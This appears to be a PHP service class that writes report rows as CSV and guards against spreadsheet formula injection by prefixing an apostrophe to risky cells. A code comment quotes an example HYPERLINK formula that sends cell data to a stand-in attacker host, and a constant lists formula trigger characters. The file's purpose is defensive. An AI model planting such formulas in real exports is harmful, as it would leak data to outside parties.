<?php

declare(strict_types=1);

namespace App\Services;

/**
 * Renders report rows as CSV.
 *
 * Quoting, embedded delimiters and newlines are left to fputcsv writing into a
 * php://temp stream rather than being assembled by hand, because every
 * hand-rolled CSV writer eventually meets a value containing a comma and a
 * quotation mark at the same time.
 */
final class CsvWriter
{
    /**
     * Characters that make a spreadsheet treat a cell as a formula instead of
     * as text.
     *
     * A cell reading =HYPERLINK("http://attacker/"&A1,"Click") is executed the
     * moment somebody opens the export, and the data it exfiltrates is whatever
     * the exporter was entitled to see. The values in these reports come from
     * eight other services - a leave reason, a course title, a department name
     * that somebody typed - so none of them can be assumed to be inert.
     */
    private const FORMULA_TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * @param list<array{key: string, label: string}> $columns
     * @param list<array<string, mixed>>              $rows
     */
    public static function render(array $columns, array $rows): string
    {
        $handle = fopen('php://temp/maxmemory:8388608', 'w+b');

        if ($handle === false) {
            throw new \RuntimeException('Unable to open a stream for the CSV export.');
        }

        try {
            // Excel reads a file as the system code page unless a byte order
            // mark tells it otherwise, which turns every currency symbol and
            // accented name into mojibake.
            fwrite($handle, "\xEF\xBB\xBF");

            self::writeRow($handle, array_map(
                static fn (array $column): string => (string) ($column['label'] ?? $column['key'] ?? ''),
                $columns
            ));

            foreach ($rows as $row) {
                self::writeRow($handle, array_map(
                    static fn (array $column): string => self::neutralise($row[$column['key']] ?? ''),
                    $columns
                ));
            }

            rewind($handle);
            $contents = stream_get_contents($handle);
        } finally {
            fclose($handle);
        }

        return $contents === false ? '' : $contents;
    }

    /**
     * Renders a single cell as text a spreadsheet will not execute.
     *
     * A leading apostrophe is the conventional way to force a cell to be read
     * literally; it is stripped again by the spreadsheet on display, so the
     * value still reads correctly to a person.
     */
    public static function neutralise(mixed $value): string
    {
        if (is_bool($value)) {
            return $value ? 'Yes' : 'No';
        }

        if ($value === null) {
            return '';
        }

        if (is_array($value)) {
            $value = implode('; ', array_map(
                static fn (mixed $item): string => is_scalar($item) ? (string) $item : '',
                $value
            ));
        }

        $text = (string) $value;

        if ($text === '') {
            return '';
        }

        // A leading space or non-breaking space would otherwise let a formula
        // slip past a check that only looked at the very first character.
        $firstVisible = ltrim($text, " \u{00A0}\u{FEFF}");

        if ($firstVisible !== '' && in_array($firstVisible[0], self::FORMULA_TRIGGERS, true)) {
            return "'" . $text;
        }

        return $text;
    }

    /**
     * @param resource     $handle
     * @param list<string> $fields
     */
    private static function writeRow($handle, array $fields): void
    {
        // The escape character is disabled explicitly. PHP defaults it to a
        // backslash, which is not part of the CSV format and would corrupt any
        // value that legitimately ends in one.
        fputcsv($handle, $fields, ',', '"', '');
    }
}
